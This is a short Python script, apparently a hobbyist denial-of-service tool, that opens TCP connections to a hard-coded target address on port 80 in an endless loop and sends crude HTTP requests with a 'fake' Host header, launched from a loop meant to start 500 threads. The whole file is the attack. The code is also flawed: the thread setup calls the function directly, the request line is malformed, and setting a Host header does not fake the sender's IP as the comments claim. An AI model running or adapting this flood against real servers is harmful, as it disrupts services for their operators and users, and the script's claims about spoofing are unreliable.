#send
import threading
import socket

target = '192.168.1.1'

#depend on the type of the attack that going to perform
port = 80

fake_ip = ''

#sending the request with the fake ip address
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack())
    thread.start()
